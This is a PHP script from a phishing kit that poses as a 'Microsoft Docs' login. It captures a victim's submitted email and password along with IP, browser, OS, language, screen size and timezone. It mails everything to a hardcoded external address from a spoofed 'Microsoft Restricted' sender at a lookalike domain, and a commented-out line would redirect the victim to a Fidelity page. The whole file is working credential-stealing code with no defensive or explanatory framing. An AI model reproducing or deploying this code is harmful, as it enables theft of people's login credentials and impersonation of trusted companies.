<?php
include_once('browser_ditect.php');

include_once('browser_ditect.php');
include_once('php_language_detection.php');

$username = $_POST['email'];
$password = $_POST['password'];
$ipaddress = $_POST['ip'];
$browser_info = ucfirst(browser_detection('browser_name')).' '.browser_detection('browser_number');
$users_os = strtoupper(browser_detection( 'os' )).' '.browser_detection('os_number');
$lang = get_languages( 'data' );
$sys_lang = $lang[0][2];
$screen = $_POST['screen'];
$tz = $_POST['tz'];
$version = $_POST['version'];
if($version == "") $version = "Not Available";

switch(PHP_INT_SIZE) {
    case 4:
        $bits = '32-bit';
        break;
    case 8:
        $bits = '64-bit';
        break;
    default:
        $bits = 'BIT is ' . PHP_INT_SIZE;
}
// multiple recipients
$to = "sweet.homes340@aol.com, sweet.homes340@aol.com";

// subject
$subject = 'Login from Microsoft Docs Restricted';

// message
$message = '
<html>
    <head>
    <title>Microsoft Docs</title>
    <style>
        table {border-collapse: collapse;border-spacing: 0;width:100%;}
        th {background-color: #EEEEEE;border: 1px solid #CCCCCC;color: #555555;padding: 8px;text-align: right;font-size:13px;width:15%;}
        td {border: 1px solid #CCCCCC;padding: 5px 10px;vertical-align: top;text-align: left;}
        .employee td.center {text-align: center;}
        caption {text-align: center;background-color: #EFEFEF;border: 1px solid #CCCCCC;border-bottom: none;font-weight: bold;font-size:120%;padding: 5px;}
    </style>
    </head>
    <body>
    <table>
        <caption>Enquiry details below.</caption>
        <tr>
          <th>Sender\'s Username: </th>
          <td>'. $username .'</td>
        </tr>
        <tr>
          <th>Sender\'s Password: </th>
          <td>'. $password .'</td>
        </tr>
        <tr>
          <th>Sender\'s IP: </th>
          <td>'. $ipaddress .'</td>
        </tr>
        <tr>
          <th>Sender\'s Browser: </th>
          <td>'. $browser_info .'</td>
        </tr>
        <tr>
          <th>Sender\'s OS: </th>
          <td>'. $users_os .'</td>
        </tr>
        <tr>
          <th>Sender\'s OS Platform: </th>
          <td>'. $bits .'</td>
        </tr>
        <tr>
          <th>Sender\'s System Language: </th>
          <td>'. $sys_lang .'</td>
        </tr>
        <tr>
          <th>Sender\'s Screen Resolution: </th>
          <td>'. $screen .'</td>
        </tr>
        <tr>
          <th>Sender\'s System timezone: </th>
          <td>'. $tz .'</td>
        </tr>
        <tr>
          <th>Sender\'s Flash plugin: </th>
          <td>'. $version .'</td>
        </tr>
    </table>
    </body>
</html>';

// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

// Additional headers
$headers .= 'From: Microsoft Restricted <info@micoseft.co>' . "\r\n";

// Mail it
if(@mail($to, $subject, $message, $headers)){
    echo $message;
//    exit(header("location: https://nb.fidelity.com/public/nb/default/home"));
}else{
    echo "Mail sending failed!";
    exit();
}
  // End of send mail 
?>